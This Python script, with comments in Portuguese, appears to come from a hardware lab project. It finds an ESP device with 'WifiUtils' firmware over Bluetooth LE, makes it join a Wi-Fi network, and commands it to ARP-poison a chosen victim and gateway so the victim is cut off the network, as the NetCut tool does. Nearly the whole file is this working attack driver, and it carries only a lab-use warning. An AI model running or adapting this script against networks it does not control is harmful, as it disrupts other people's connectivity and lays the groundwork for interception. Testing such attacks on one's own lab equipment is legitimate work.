#!/usr/bin/env python3
"""
ARP poisoning ("NetCut") via firmware WifiUtils.

Fluxo:
    1. Conecta ESP em rede WiFi (--ssid + --psk)
    2. Dispara arp_cut contra o target informado
    3. (após terminar) ESP continua conectado; pode rodar de novo ou
       chamar wifi_disconnect.

ATENÇÃO: uso restrito a redes/dispositivos próprios em laboratório.
Maioria das redes corporativas tem Dynamic ARP Inspection (DAI) e o
ataque é silenciosamente bloqueado pelo switch.

Uso:
    ~/.platformio/penv/bin/python scripts/arp_cut_test.py \\
        --ssid "MinhaRedeLab" --psk "senha123" \\
        --target-ip 192.168.1.50 --target-mac aa:bb:cc:dd:ee:ff \\
        --gateway-ip 192.168.1.1 --gateway-mac 11:22:33:44:55:66 \\
        --duration 30
"""
import argparse
import asyncio
import json
import sys

from bleak import BleakClient, BleakScanner

SVC_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c01"
CMD_UUID = "e7c0c5a0-4f1f-4b1a-9d6c-1a8d4b5e0c02"


async def find_target():
    print("→ scanning for WifiUtils-* device...")
    async with BleakScanner(service_uuids=[SVC_UUID]) as sc:
        await asyncio.sleep(5)
        for d in sc.discovered_devices:
            if (d.name or "").startswith("WifiUtils-"):
                return d
    return None


async def send_and_wait(client, queue, payload, timeout=20.0):
    print(f"→ {payload}")
    await client.write_gatt_char(CMD_UUID, payload.encode("utf-8"), response=True)
    try:
        resp = await asyncio.wait_for(queue.get(), timeout=timeout)
        print(f"← {resp}")
        return resp
    except asyncio.TimeoutError:
        print("  ✗ timeout")
        return None


async def run(args):
    dev = await find_target()
    if not dev:
        print("✗ WifiUtils device not found"); sys.exit(2)
    print(f"→ connecting to {dev.address} ({dev.name})")

    async with BleakClient(dev) as client:
        queue: asyncio.Queue = asyncio.Queue()

        def cb(_h, data):
            try:
                queue.put_nowait(json.loads(data.decode("utf-8")))
            except Exception:
                queue.put_nowait({"_raw": bytes(data)})

        await client.start_notify(CMD_UUID, cb)

        # 1) wifi_connect
        wc = {"cmd": "wifi_connect", "seq": 1, "ssid": args.ssid}
        if args.psk:
            wc["password"] = args.psk
        wc["timeout_ms"] = args.connect_timeout_ms
        resp = await send_and_wait(client, queue, json.dumps(wc), timeout=args.connect_timeout_ms / 1000 + 5)
        if not resp or resp.get("status") != "connected":
            print("✗ wifi_connect failed"); return

        # 2) arp_cut
        ac = {
            "cmd": "arp_cut", "seq": 2,
            "target_ip": args.target_ip,
            "target_mac": args.target_mac,
            "gateway_ip": args.gateway_ip,
            "gateway_mac": args.gateway_mac,
            "interval_ms": args.interval_ms,
            "duration_sec": args.duration,
        }
        await send_and_wait(client, queue, json.dumps(ac), timeout=5)

        print(f"→ aguardando {args.duration}s do cut...")
        await asyncio.sleep(args.duration + 2)

        # 3) wifi_disconnect (opcional)
        if args.disconnect_after:
            wd = {"cmd": "wifi_disconnect", "seq": 3}
            await send_and_wait(client, queue, json.dumps(wd), timeout=5)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="NetCut-like ARP cut via firmware WifiUtils.",
    )
    parser.add_argument("--ssid", required=True, help="SSID da rede 2.4GHz alvo")
    parser.add_argument("--psk", default="", help="Senha WPA/WPA2 (vazio = rede aberta)")
    parser.add_argument("--target-ip", required=True, help="IP da vítima (ex: 192.168.1.50)")
    parser.add_argument("--target-mac", required=True, help="MAC da vítima (ex: aa:bb:cc:dd:ee:ff)")
    parser.add_argument("--gateway-ip", required=True, help="IP do gateway")
    parser.add_argument("--gateway-mac", required=True, help="MAC do gateway")
    parser.add_argument("--interval-ms", type=int, default=1000, help="Intervalo entre poison (default 1000)")
    parser.add_argument("--duration", type=int, default=30, help="Duração em segundos (default 30, max 600)")
    parser.add_argument("--connect-timeout-ms", type=int, default=15000, help="Timeout do DHCP (default 15s)")
    parser.add_argument("--disconnect-after", action="store_true", help="Chama wifi_disconnect ao final")
    args = parser.parse_args()

    asyncio.run(run(args))
